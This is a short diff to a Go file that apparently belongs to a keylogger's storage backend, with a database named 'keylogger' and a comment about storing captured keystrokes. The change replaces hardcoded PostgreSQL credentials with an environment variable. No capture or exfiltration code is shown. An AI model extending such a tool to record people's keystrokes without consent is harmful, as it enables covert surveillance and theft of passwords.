@@ -2,7 +2,6 @@ package main
 
 import (
 	"database/sql"
-	"fmt"
 	"log"
 	"os"
 	"strings"
@@ -11,19 +10,9 @@ import (
 	"github.com/streadway/amqp"
 )
 
-const (
-	host     = "localhost"
-	port     = 5432
-	user     = "postgres"
-	password = "password"
-	dbname   = "keylogger"
-)
-
 func main() {
 	// Store captured keystrokes in database
-	psqlconn := fmt.Sprintf("host=%s port=%d user=%s password=%s dbname=%s sslmode=disable",
-		host, port, user, password, dbname)
-	db, err := sql.Open("postgres", psqlconn)
+	db, err := sql.Open("postgres", os.Getenv("PSQL_CONN"))
 	if err != nil {
 		log.Fatalf("Error connecting to database: %v\n", err)
 	}
